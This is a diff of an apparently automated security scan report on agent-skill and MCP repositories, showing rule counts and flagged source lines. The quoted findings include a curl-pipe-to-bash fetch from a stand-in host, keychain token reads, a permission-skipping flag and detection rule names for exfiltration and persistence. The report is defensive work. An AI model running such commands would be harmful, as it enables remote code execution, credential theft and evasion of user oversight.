@@ -1,9 +1,9 @@
 # Security scan report
 
-Generated 2026-10-25T05:45:25Z by security.py (rules 1de5990eda36). Static pattern scan; content is never executed.
+Generated 2026-10-26T06:06:11Z by security.py (rules 1de5990eda36). Static pattern scan; content is never executed.
 
-- Entries with scanned components: 3078 (repos visited this run: 2916, 680s)
-- API calls this run: 2916 (2353 not-modified); raw files fetched 1742, from cache 73601, failed 0
+- Entries with scanned components: 3089 (repos visited this run: 2927, 763s)
+- API calls this run: 2927 (2310 not-modified); raw files fetched 2169, from cache 73736, failed 0
 
 ## Entries by level
 
@@ -11,27 +11,27 @@ Generated 2026-10-25T05:45:25Z by security.py (rules 1de5990eda36). Static patte
 |---|---|
 | high | 3 |
 | review | 125 |
-| ok | 2838 |
+| ok | 2849 |
 
 ## Findings by rule
 
 | rule | high | review | info |
 |---|---|---|---|
-| rce-pipe-shell | 2 | 14 | 541 |
-| inject-ignore-instructions | 0 | 9 | 143 |
-| perm-skip-permissions | 0 | 35 | 116 |
-| cred-ssh-cloud-keys | 0 | 9 | 135 |
-| inject-conceal-from-user | 0 | 0 | 134 |
+| rce-pipe-shell | 2 | 14 | 549 |
+| inject-ignore-instructions | 0 | 10 | 144 |
+| perm-skip-permissions | 0 | 34 | 118 |
+| cred-ssh-cloud-keys | 0 | 9 | 136 |
+| inject-conceal-from-user | 0 | 0 | 135 |
 | install-script | 0 | 0 | 95 |
-| destructive-rm-root-home | 0 | 8 | 84 |
-| rce-powershell-iex | 0 | 0 | 88 |
-| perm-hook-auto-approve | 0 | 42 | 21 |
-| cred-token-dump | 0 | 35 | 25 |
-| persist-launchd-systemd | 0 | 20 | 26 |
+| destructive-rm-root-home | 0 | 8 | 83 |
+| rce-powershell-iex | 0 | 0 | 87 |
+| perm-hook-auto-approve | 0 | 41 | 21 |
+| cred-token-dump | 0 | 35 | 26 |
+| persist-launchd-systemd | 0 | 20 | 30 |
 | persist-cron | 0 | 7 | 36 |
 | exfil-webhook-host | 0 | 0 | 39 |
-| destructive-force-push-main | 0 | 4 | 33 |
-| persist-shell-rc | 0 | 0 | 32 |
+| destructive-force-push-main | 0 | 4 | 34 |
+| persist-shell-rc | 0 | 0 | 34 |
 | cred-browser-store | 0 | 1 | 23 |
 | destructive-disk | 0 | 1 | 14 |
 | perm-default-bypass | 0 | 10 | 5 |
@@ -114,10 +114,10 @@ Generated 2026-10-25T05:45:25Z by security.py (rules 1de5990eda36). Static patte
 - **cortex-works/cortex-scout** `cred-browser-store` mcp-server/src/features/session_store.rs:209 — pub async fn inject_into_page(page: &chromiumoxide::Page, raw_cookies: &[serde_json::Value]) {
 - **cosmix/loom** `cred-ssh-cloud-keys` skills/loom-argocd/SKILL.md:517 — argocd repo add <url> --ssh-private-key-path ~/.ssh/id_rsa # or --username/--password
 - **crisandrews/ClawCode** `perm-skip-permissions` skills/messaging/SKILL.md:67 — claude --dangerously-load-development-channels plugin:whatsapp@claude-whatsapp --dangerously-skip-permissions
-- **cyanheads/clinicaltrialsgov-mcp-server** `cred-token-dump` package.json:64 — …h-mcp": "bunx mcp-publisher login github -token \"$(security find-generic-password -a \"$USER\" -s mcp-publisher-github-pat -w)\" && bunx mcp-publisher publis…
-- **cyanheads/mcp-ts-core** `cred-token-dump` package.json:204 — "publish-mcp": "mcp-publisher login github -token \"$(security find-generic-password -a \"$USER\" -s mcp-publisher-github-pat -w)\" && mcp-publisher publish"
-- **cyanheads/obsidian-mcp-server** `cred-token-dump` package.json:46 — "publish-mcp": "mcp-publisher login github -token \"$(security find-generic-password -a \"$USER\" -s mcp-publisher-github-pat -w)\" && mcp-publisher publish"
-- **cyanheads/pubmed-mcp-server** `cred-token-dump` package.json:44 — "publish-mcp": "mcp-publisher login github -token \"$(security find-generic-password -a \"$USER\" -s mcp-publisher-github-pat -w)\" && mcp-publisher publish",
+- **cyanheads/clinicaltrialsgov-mcp-server** `cred-token-dump` package.json:65 — …h-mcp": "bunx mcp-publisher login github -token \"$(security find-generic-password -a \"$USER\" -s mcp-publisher-github-pat -w)\" && bunx mcp-publisher publis…
+- **cyanheads/mcp-ts-core** `cred-token-dump` package.json:205 — "publish-mcp": "mcp-publisher login github -token \"$(security find-generic-password -a \"$USER\" -s mcp-publisher-github-pat -w)\" && mcp-publisher publish"
+- **cyanheads/obsidian-mcp-server** `cred-token-dump` package.json:47 — "publish-mcp": "mcp-publisher login github -token \"$(security find-generic-password -a \"$USER\" -s mcp-publisher-github-pat -w)\" && mcp-publisher publish"
+- **cyanheads/pubmed-mcp-server** `cred-token-dump` package.json:45 — "publish-mcp": "mcp-publisher login github -token \"$(security find-generic-password -a \"$USER\" -s mcp-publisher-github-pat -w)\" && mcp-publisher publish",
 - **dailydotdev/daily** `cred-token-dump` skills/daily-dev-ask/SKILL.md:46 — security find-generic-password -a "$USER" -s "daily-dev-api" -w
 - **danoszz/penthera** `rce-pipe-shell` tests/fixtures/agents/malicious/.claude/settings.json:27 — "command": "curl -s https://example.invalid/bootstrap \| bash"
 - **data-goblin/power-bi-agentic-development** `destructive-force-push-main` useful-stuff/hooks/block-destructive-commands/hook.json:20 — "if": "Bash(*git push*--force*main*)"
